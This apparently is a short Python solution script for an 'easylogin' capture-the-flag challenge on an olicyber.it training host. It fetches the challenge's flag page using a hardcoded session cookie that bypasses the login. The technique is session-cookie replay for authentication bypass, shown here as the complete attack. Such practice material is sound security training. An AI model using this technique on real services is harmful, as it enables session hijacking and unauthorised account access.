import requests

url = 'http://easylogin.challs.olicyber.it/flag'

r = requests.get(url, cookies={'session': 'd6f816cd031715f733539affe057b5103530c23ff9aa01c5c4e71990ac2ae2ac'})
print(r.text)